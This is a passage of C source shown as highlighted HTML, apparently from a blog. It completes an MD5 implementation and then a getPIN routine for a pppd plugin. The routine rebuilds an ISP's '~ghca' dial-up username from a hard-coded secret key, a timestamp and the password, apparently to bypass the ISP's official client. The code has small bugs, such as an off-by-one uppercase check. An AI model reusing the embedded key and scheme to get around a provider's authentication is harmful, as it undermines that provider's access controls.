class="line">MD5Transform(context-&gt;state, context-&gt;<span class="built_in">buffer</span>);</span><br><span class="line"><span class="keyword">for</span> (i = partlen; i + <span class="number">64</span> &lt;= inputlen; i += <span class="number">64</span>)</span><br><span class="line">MD5Transform(context-&gt;state, &amp;input[i]);</span><br><span class="line">index = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;context-&gt;<span class="built_in">buffer</span>[index], &amp;input[i], inputlen - i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Final</span><span class="params">(MD5_CTX *context, <span class="keyword">unsigned</span> <span class="keyword">char</span> digest[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index = <span class="number">0</span>, padlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> bits[<span class="number">8</span>];</span><br><span class="line">index = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">padlen = (index &lt; <span class="number">56</span>) ? (<span class="number">56</span> - index) : (<span class="number">120</span> - index);</span><br><span class="line">MD5Encode(bits, context-&gt;count, <span class="number">8</span>);</span><br><span class="line">MD5Update(context, PADDING, padlen);</span><br><span class="line">MD5Update(context, bits, <span class="number">8</span>);</span><br><span class="line">MD5Encode(digest, context-&gt;state, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Encode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *output, <span class="keyword">unsigned</span> <span class="keyword">int</span> *input, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (j &lt; len)</span><br><span class="line">&#123;</span><br><span class="line">output[j] = input[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">output[j + <span class="number">1</span>] = (input[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">output[j + <span class="number">2</span>] = (input[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">output[j + <span class="number">3</span>] = (input[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">i++;</span><br><span class="line">j += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Decode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *output, <span class="keyword">unsigned</span> <span class="keyword">char</span> *input, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (j &lt; len)</span><br><span class="line">&#123;</span><br><span class="line">output[i] = (input[j]) |</span><br><span class="line">(input[j + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">(input[j + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">(input[j + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">i++;</span><br><span class="line">j += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Transform</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> state[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> block[<span class="number">64</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a = state[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> b = state[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> c = state[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> d = state[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> x[<span class="number">64</span>];</span><br><span class="line">MD5Decode(x, block, <span class="number">64</span>);</span><br><span class="line">FF(a, b, c, d, x[<span class="number">0</span>], <span class="number">7</span>, <span class="number">0xd76aa478</span>); <span class="comment">/* 1 */</span></span><br><span class="line">FF(d, a, b, c, x[<span class="number">1</span>], <span class="number">12</span>, <span class="number">0xe8c7b756</span>); <span class="comment">/* 2 */</span></span><br><span class="line">FF(c, d, a, b, x[<span class="number">2</span>], <span class="number">17</span>, <span class="number">0x242070db</span>); <span class="comment">/* 3 */</span></span><br><span class="line">FF(b, c, d, a, x[<span class="number">3</span>], <span class="number">22</span>, <span class="number">0xc1bdceee</span>); <span class="comment">/* 4 */</span></span><br><span class="line">FF(a, b, c, d, x[<span class="number">4</span>], <span class="number">7</span>, <span class="number">0xf57c0faf</span>); <span class="comment">/* 5 */</span></span><br><span class="line">FF(d, a, b, c, x[<span class="number">5</span>], <span class="number">12</span>, <span class="number">0x4787c62a</span>); <span class="comment">/* 6 */</span></span><br><span class="line">FF(c, d, a, b, x[<span class="number">6</span>], <span class="number">17</span>, <span class="number">0xa8304613</span>); <span class="comment">/* 7 */</span></span><br><span class="line">FF(b, c, d, a, x[<span class="number">7</span>], <span class="number">22</span>, <span class="number">0xfd469501</span>); <span class="comment">/* 8 */</span></span><br><span class="line">FF(a, b, c, d, x[<span class="number">8</span>], <span class="number">7</span>, <span class="number">0x698098d8</span>); <span class="comment">/* 9 */</span></span><br><span class="line">FF(d, a, b, c, x[<span class="number">9</span>], <span class="number">12</span>, <span class="number">0x8b44f7af</span>); <span class="comment">/* 10 */</span></span><br><span class="line">FF(c, d, a, b, x[<span class="number">10</span>], <span class="number">17</span>, <span class="number">0xffff5bb1</span>); <span class="comment">/* 11 */</span></span><br><span class="line">FF(b, c, d, a, x[<span class="number">11</span>], <span class="number">22</span>, <span class="number">0x895cd7be</span>); <span class="comment">/* 12 */</span></span><br><span class="line">FF(a, b, c, d, x[<span class="number">12</span>], <span class="number">7</span>, <span class="number">0x6b901122</span>); <span class="comment">/* 13 */</span></span><br><span class="line">FF(d, a, b, c, x[<span class="number">13</span>], <span class="number">12</span>, <span class="number">0xfd987193</span>); <span class="comment">/* 14 */</span></span><br><span class="line">FF(c, d, a, b, x[<span class="number">14</span>], <span class="number">17</span>, <span class="number">0xa679438e</span>); <span class="comment">/* 15 */</span></span><br><span class="line">FF(b, c, d, a, x[<span class="number">15</span>], <span class="number">22</span>, <span class="number">0x49b40821</span>); <span class="comment">/* 16 */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Round 2 */</span></span><br><span class="line">GG(a, b, c, d, x[<span class="number">1</span>], <span class="number">5</span>, <span class="number">0xf61e2562</span>); <span class="comment">/* 17 */</span></span><br><span class="line">GG(d, a, b, c, x[<span class="number">6</span>], <span class="number">9</span>, <span class="number">0xc040b340</span>); <span class="comment">/* 18 */</span></span><br><span class="line">GG(c, d, a, b, x[<span class="number">11</span>], <span class="number">14</span>, <span class="number">0x265e5a51</span>); <span class="comment">/* 19 */</span></span><br><span class="line">GG(b, c, d, a, x[<span class="number">0</span>], <span class="number">20</span>, <span class="number">0xe9b6c7aa</span>); <span class="comment">/* 20 */</span></span><br><span class="line">GG(a, b, c, d, x[<span class="number">5</span>], <span class="number">5</span>, <span class="number">0xd62f105d</span>); <span class="comment">/* 21 */</span></span><br><span class="line">GG(d, a, b, c, x[<span class="number">10</span>], <span class="number">9</span>, <span class="number">0x2441453</span>); <span class="comment">/* 22 */</span></span><br><span class="line">GG(c, d, a, b, x[<span class="number">15</span>], <span class="number">14</span>, <span class="number">0xd8a1e681</span>); <span class="comment">/* 23 */</span></span><br><span class="line">GG(b, c, d, a, x[<span class="number">4</span>], <span class="number">20</span>, <span class="number">0xe7d3fbc8</span>); <span class="comment">/* 24 */</span></span><br><span class="line">GG(a, b, c, d, x[<span class="number">9</span>], <span class="number">5</span>, <span class="number">0x21e1cde6</span>); <span class="comment">/* 25 */</span></span><br><span class="line">GG(d, a, b, c, x[<span class="number">14</span>], <span class="number">9</span>, <span class="number">0xc33707d6</span>); <span class="comment">/* 26 */</span></span><br><span class="line">GG(c, d, a, b, x[<span class="number">3</span>], <span class="number">14</span>, <span class="number">0xf4d50d87</span>); <span class="comment">/* 27 */</span></span><br><span class="line">GG(b, c, d, a, x[<span class="number">8</span>], <span class="number">20</span>, <span class="number">0x455a14ed</span>); <span class="comment">/* 28 */</span></span><br><span class="line">GG(a, b, c, d, x[<span class="number">13</span>], <span class="number">5</span>, <span class="number">0xa9e3e905</span>); <span class="comment">/* 29 */</span></span><br><span class="line">GG(d, a, b, c, x[<span class="number">2</span>], <span class="number">9</span>, <span class="number">0xfcefa3f8</span>); <span class="comment">/* 30 */</span></span><br><span class="line">GG(c, d, a, b, x[<span class="number">7</span>], <span class="number">14</span>, <span class="number">0x676f02d9</span>); <span class="comment">/* 31 */</span></span><br><span class="line">GG(b, c, d, a, x[<span class="number">12</span>], <span class="number">20</span>, <span class="number">0x8d2a4c8a</span>); <span class="comment">/* 32 */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Round 3 */</span></span><br><span class="line">HH(a, b, c, d, x[<span class="number">5</span>], <span class="number">4</span>, <span class="number">0xfffa3942</span>); <span class="comment">/* 33 */</span></span><br><span class="line">HH(d, a, b, c, x[<span class="number">8</span>], <span class="number">11</span>, <span class="number">0x8771f681</span>); <span class="comment">/* 34 */</span></span><br><span class="line">HH(c, d, a, b, x[<span class="number">11</span>], <span class="number">16</span>, <span class="number">0x6d9d6122</span>); <span class="comment">/* 35 */</span></span><br><span class="line">HH(b, c, d, a, x[<span class="number">14</span>], <span class="number">23</span>, <span class="number">0xfde5380c</span>); <span class="comment">/* 36 */</span></span><br><span class="line">HH(a, b, c, d, x[<span class="number">1</span>], <span class="number">4</span>, <span class="number">0xa4beea44</span>); <span class="comment">/* 37 */</span></span><br><span class="line">HH(d, a, b, c, x[<span class="number">4</span>], <span class="number">11</span>, <span class="number">0x4bdecfa9</span>); <span class="comment">/* 38 */</span></span><br><span class="line">HH(c, d, a, b, x[<span class="number">7</span>], <span class="number">16</span>, <span class="number">0xf6bb4b60</span>); <span class="comment">/* 39 */</span></span><br><span class="line">HH(b, c, d, a, x[<span class="number">10</span>], <span class="number">23</span>, <span class="number">0xbebfbc70</span>); <span class="comment">/* 40 */</span></span><br><span class="line">HH(a, b, c, d, x[<span class="number">13</span>], <span class="number">4</span>, <span class="number">0x289b7ec6</span>); <span class="comment">/* 41 */</span></span><br><span class="line">HH(d, a, b, c, x[<span class="number">0</span>], <span class="number">11</span>, <span class="number">0xeaa127fa</span>); <span class="comment">/* 42 */</span></span><br><span class="line">HH(c, d, a, b, x[<span class="number">3</span>], <span class="number">16</span>, <span class="number">0xd4ef3085</span>); <span class="comment">/* 43 */</span></span><br><span class="line">HH(b, c, d, a, x[<span class="number">6</span>], <span class="number">23</span>, <span class="number">0x4881d05</span>); <span class="comment">/* 44 */</span></span><br><span class="line">HH(a, b, c, d, x[<span class="number">9</span>], <span class="number">4</span>, <span class="number">0xd9d4d039</span>); <span class="comment">/* 45 */</span></span><br><span class="line">HH(d, a, b, c, x[<span class="number">12</span>], <span class="number">11</span>, <span class="number">0xe6db99e5</span>); <span class="comment">/* 46 */</span></span><br><span class="line">HH(c, d, a, b, x[<span class="number">15</span>], <span class="number">16</span>, <span class="number">0x1fa27cf8</span>); <span class="comment">/* 47 */</span></span><br><span class="line">HH(b, c, d, a, x[<span class="number">2</span>], <span class="number">23</span>, <span class="number">0xc4ac5665</span>); <span class="comment">/* 48 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Round 4 */</span></span><br><span class="line">II(a, b, c, d, x[<span class="number">0</span>], <span class="number">6</span>, <span class="number">0xf4292244</span>); <span class="comment">/* 49 */</span></span><br><span class="line">II(d, a, b, c, x[<span class="number">7</span>], <span class="number">10</span>, <span class="number">0x432aff97</span>); <span class="comment">/* 50 */</span></span><br><span class="line">II(c, d, a, b, x[<span class="number">14</span>], <span class="number">15</span>, <span class="number">0xab9423a7</span>); <span class="comment">/* 51 */</span></span><br><span class="line">II(b, c, d, a, x[<span class="number">5</span>], <span class="number">21</span>, <span class="number">0xfc93a039</span>); <span class="comment">/* 52 */</span></span><br><span class="line">II(a, b, c, d, x[<span class="number">12</span>], <span class="number">6</span>, <span class="number">0x655b59c3</span>); <span class="comment">/* 53 */</span></span><br><span class="line">II(d, a, b, c, x[<span class="number">3</span>], <span class="number">10</span>, <span class="number">0x8f0ccc92</span>); <span class="comment">/* 54 */</span></span><br><span class="line">II(c, d, a, b, x[<span class="number">10</span>], <span class="number">15</span>, <span class="number">0xffeff47d</span>); <span class="comment">/* 55 */</span></span><br><span class="line">II(b, c, d, a, x[<span class="number">1</span>], <span class="number">21</span>, <span class="number">0x85845dd1</span>); <span class="comment">/* 56 */</span></span><br><span class="line">II(a, b, c, d, x[<span class="number">8</span>], <span class="number">6</span>, <span class="number">0x6fa87e4f</span>); <span class="comment">/* 57 */</span></span><br><span class="line">II(d, a, b, c, x[<span class="number">15</span>], <span class="number">10</span>, <span class="number">0xfe2ce6e0</span>); <span class="comment">/* 58 */</span></span><br><span class="line">II(c, d, a, b, x[<span class="number">6</span>], <span class="number">15</span>, <span class="number">0xa3014314</span>); <span class="comment">/* 59 */</span></span><br><span class="line">II(b, c, d, a, x[<span class="number">13</span>], <span class="number">21</span>, <span class="number">0x4e0811a1</span>); <span class="comment">/* 60 */</span></span><br><span class="line">II(a, b, c, d, x[<span class="number">4</span>], <span class="number">6</span>, <span class="number">0xf7537e82</span>); <span class="comment">/* 61 */</span></span><br><span class="line">II(d, a, b, c, x[<span class="number">11</span>], <span class="number">10</span>, <span class="number">0xbd3af235</span>); <span class="comment">/* 62 */</span></span><br><span class="line">II(c, d, a, b, x[<span class="number">2</span>], <span class="number">15</span>, <span class="number">0x2ad7d2bb</span>); <span class="comment">/* 63 */</span></span><br><span class="line">II(b, c, d, a, x[<span class="number">9</span>], <span class="number">21</span>, <span class="number">0xeb86d391</span>); <span class="comment">/* 64 */</span></span><br><span class="line">state[<span class="number">0</span>] += a;</span><br><span class="line">state[<span class="number">1</span>] += b;</span><br><span class="line">state[<span class="number">2</span>] += c;</span><br><span class="line">state[<span class="number">3</span>] += d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/************************MD5实现***************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//算号函数（PIN为最终算得的账号）</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getPIN</span><span class="params">(<span class="keyword">byte</span> *username, <span class="keyword">byte</span> *PIN)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// info("-------------debug6-----------");</span></span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">100</span>] =</span><br><span class="line"><span class="string">"aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmBjKN28j"</span>;</span><br><span class="line"><span class="keyword">char</span> hex_time[<span class="number">200</span>]; <span class="comment">//十六进制时间戳</span></span><br><span class="line"><span class="keyword">unsigned</span> i;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取当前时间戳，并转换为十六进制</span></span><br><span class="line"><span class="keyword">time_t</span> t;</span><br><span class="line">t = time(<span class="number">0</span>);</span><br><span class="line">t = (<span class="keyword">long</span> <span class="keyword">long</span>)t;</span><br><span class="line"><span class="built_in">sprintf</span>(hex_time, <span class="string">"%x"</span>, (<span class="keyword">int</span>)t);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将用户名转换为大写</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; username[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (username[i] &gt; <span class="string">'a'</span> &amp;&amp; username[i] &lt; <span class="string">'z'</span>)</span><br><span class="line">&#123;</span><br><span class="line">username[i] -= <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将密码ASCII值求和</span></span><br><span class="line"><span class="keyword">unsigned</span> j, sum_pass = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; password[j] != <span class="string">'\0'</span>; j++) &#123;</span><br><span class="line">sum_pass += password[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用时间戳和密码长度进行处理</span></span><br><span class="line"><span class="keyword">int</span> t_pass_len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> t_flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> t_temp = <span class="number">0</span>;</span><br><span class="line">t_pass_len = ((<span class="keyword">int</span>)t) % <span class="built_in">strlen</span>(password);</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算t_flag</span></span><br><span class="line"><span class="keyword">if</span> (t_pass_len &lt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">t_flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">t_flag = t_pass_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据时间戳和密码长度得到需要与密码ascii和相与的数</span></span><br><span class="line"><span class="keyword">int</span> seed;</span><br><span class="line"><span class="keyword">if</span> (t_flag == <span class="built_in">strlen</span>(password))</span><br><span class="line">&#123;</span><br><span class="line">seed = t_flag - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">seed = t_flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// info("-------------debug7-----------");</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">int</span> a = sum_pass ^ (seed) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line"><span class="keyword">char</span> password_hex[<span class="number">20</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(password_hex, <span class="string">"%04x"</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算需要截取的第一部分密码长度</span></span><br><span class="line"><span class="keyword">unsigned</span> pass_split_len = seed + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//截取第一部分密码</span></span><br><span class="line"><span class="keyword">char</span> passwd_one[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pass_split_len; i++)</span><br><span class="line">&#123;</span><br><span class="line">passwd_one[i] = password[i];</span><br><span class="line">&#125;</span><br><span class="line">passwd_one[i] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> passwd_two[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; password[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">passwd_two[j++] = password[i];</span><br><span class="line">&#125;</span><br><span class="line">passwd_two[j] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//截取密钥第一部分，长度为60-len(passwd_one)</span></span><br><span class="line"><span class="keyword">char</span> enc_key_one[<span class="number">60</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (<span class="number">60</span> - <span class="built_in">strlen</span>(passwd_one)); i++)</span><br><span class="line">&#123;</span><br><span class="line">enc_key_one[i] = key[i];</span><br><span class="line">&#125;</span><br><span class="line">enc_key_one[i] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//截取密钥第二部分，长度为64-len(宽带用户名)-len(截取的密码的第二部分)</span></span><br><span class="line"><span class="keyword">char</span> enc_key_two[<span class="number">60</span>];</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; (<span class="number">64</span> - <span class="built_in">strlen</span>(username) - <span class="built_in">strlen</span>(passwd_two)); j++)</span><br><span class="line">&#123;</span><br><span class="line">enc_key_two[j] = key[j];</span><br><span class="line">&#125;</span><br><span class="line">enc_key_two[j] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组合待md5的字符串，</span></span><br><span class="line"><span class="comment">//密钥的第一部分 + 截取的密码的第一部分 + 账号 + 密钥的第二部分 + 截取的密码的另一部分</span></span><br><span class="line"><span class="keyword">char</span> key_str[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">int</span> k, l, m, n, s;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>, i = <span class="number">0</span>; enc_key_one[i] != <span class="string">'\0'</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line">key_str[k] = enc_key_one[i++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (l = k, i = <span class="number">0</span>; passwd_one[i] != <span class="string">'\0'</span>; l++)</span><br><span class="line">&#123;</span><br><span class="line">key_str[l] = passwd_one[i++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (m = l, i = <span class="number">0</span>; username[i] != <span class="string">'\0'</span>; m++)</span><br><span class="line">&#123;</span><br><span class="line">key_str[m] = username[i++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (n = m, i = <span class="number">0</span>; enc_key_two[i] != <span class="string">'\0'</span>; n++)</span><br><span class="line">&#123;</span><br><span class="line">key_str[n] = enc_key_two[i++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (s = n, i = <span class="number">0</span>; passwd_two[i] != <span class="string">'\0'</span>; s++)</span><br><span class="line">&#123;</span><br><span class="line">key_str[s] = passwd_two[i++];</span><br><span class="line">&#125;</span><br><span class="line">key_str[s] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将时间戳高低位互换</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> swap_time_stamp; </span><br><span class="line">swap_time_stamp = (t &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xFF000000</span>;</span><br><span class="line">swap_time_stamp += (t &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0x00FF0000</span>;</span><br><span class="line">swap_time_stamp += (t &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x0000FF00</span>;</span><br><span class="line">swap_time_stamp += (t &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x000000FF</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取ASCII值</span></span><br><span class="line"><span class="keyword">int</span> byte_four = (swap_time_stamp &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line"><span class="keyword">int</span> byte_three = (swap_time_stamp &amp; <span class="number">0x00ff0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line"><span class="keyword">int</span> byte_two = (swap_time_stamp &amp; <span class="number">0x0000ff00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span> byte_one = swap_time_stamp &amp; <span class="number">0x000000ff</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//组合一波待md5的字符串,组合方式：高低16位互换的时间戳+key_str</span></span><br><span class="line"><span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key_str_final[<span class="number">500</span>]; <span class="comment">//byte_one, byte_three 超过127，故应该用unsigned char类型</span></span><br><span class="line">key_str_final[<span class="number">0</span>] = (<span class="keyword">char</span>)byte_one;</span><br><span class="line">key_str_final[<span class="number">1</span>] = (<span class="keyword">char</span>)byte_two;</span><br><span class="line">key_str_final[<span class="number">2</span>] = (<span class="keyword">char</span>)byte_three;</span><br><span class="line">key_str_final[<span class="number">3</span>] = (<span class="keyword">char</span>)byte_four;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">4</span>, i = <span class="number">0</span>; key_str[i] != <span class="string">'\0'</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line">key_str_final[p] = key_str[i++];</span><br><span class="line">&#125;</span><br><span class="line">key_str_final[p] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//info("-------------debug8-----------");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//两次MD5</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> fir_md5[<span class="number">100</span>];</span><br><span class="line">MD5_CTX md5;</span><br><span class="line">MD5Init(&amp;md5);</span><br><span class="line">MD5Update(&amp;md5, key_str_final, <span class="built_in">strlen</span>((<span class="keyword">char</span> *)key_str_final));</span><br><span class="line">MD5Final(&amp;md5, fir_md5);</span><br><span class="line">fir_md5[<span class="number">16</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//info("-------------debug9-----------");</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sec_md5[<span class="number">100</span>];</span><br><span class="line">MD5_CTX md6;</span><br><span class="line">MD5Init(&amp;md6);</span><br><span class="line">MD5Update(&amp;md6, fir_md5, <span class="built_in">strlen</span>((<span class="keyword">char</span> *)fir_md5));</span><br><span class="line">MD5Final(&amp;md6, sec_md5);</span><br><span class="line">sec_md5[<span class="number">16</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//info("-------------debug10-----------");</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> part_four[<span class="number">100</span>] = &#123; <span class="string">'\0'</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (<span class="built_in">strlen</span>(sec_md5) / <span class="number">2</span>); i++)</span><br><span class="line">&#123;</span><br><span class="line">part_four[i] = sec_md5[i];</span><br><span class="line">&#125;</span><br><span class="line">part_four[<span class="number">8</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> part_four_hex[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> temp[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; part_four[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">"%02x"</span>, part_four[i]);</span><br><span class="line">part_four_hex[j] = temp[<span class="number">0</span>];</span><br><span class="line">part_four_hex[j + <span class="number">1</span>] = temp[<span class="number">1</span>];</span><br><span class="line">j += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//info("-------------debug11-----------");</span></span><br><span class="line"></span><br><span class="line">part_four_hex[j] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//收工，组装算得的账号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">5</span>, j = <span class="number">0</span>; hex_time[j] != <span class="string">'\0'</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">PIN[i++] = hex_time[j];</span><br><span class="line">&#125;</span><br><span class="line">PIN[i++] = <span class="string">'2'</span>;</span><br><span class="line">PIN[i++] = <span class="string">'0'</span>;</span><br><span class="line">PIN[i++] = <span class="string">'2'</span>;</span><br><span class="line">PIN[i++] = <span class="string">'3'</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; part_four_hex[j] != <span class="string">'\0'</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">PIN[i++] = part_four_hex[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; password_hex[j] != <span class="string">'\0'</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">PIN[i++] = password_hex[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; username[j] != <span class="string">'\0'</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">PIN[i++] = username[j];</span><br><span class="line">&#125;</span><br><span class="line">PIN[i] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//info("-------------debug12-----------");</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// info("-------------------------------------");</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pap_modifyusername</span><span class="params">(<span class="keyword">char</span> *user, <span class="keyword">char</span>* passwd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// info("-------------debug3-----------");</span></span><br><span class="line">    <span class="keyword">byte</span> PIN[MAXSECRETLEN] = &#123;<span class="string">"~ghca"</span>&#125;;</span><br><span class="line">   <span class="comment">// info("-------------debug4-----------");</span></span><br><span class="line">    getPIN(saveuser, PIN);</span><br><span class="line">   <span class="comment">// info("-------------debug5-----------");</span></span><br><span class="line">    <span class="built_in">strcpy</span>(user, PIN);</span><br><span class="line">    info(<span class="string">"sxplugin : user  is &lt;%s&gt; "</span>,user);</span><br><span 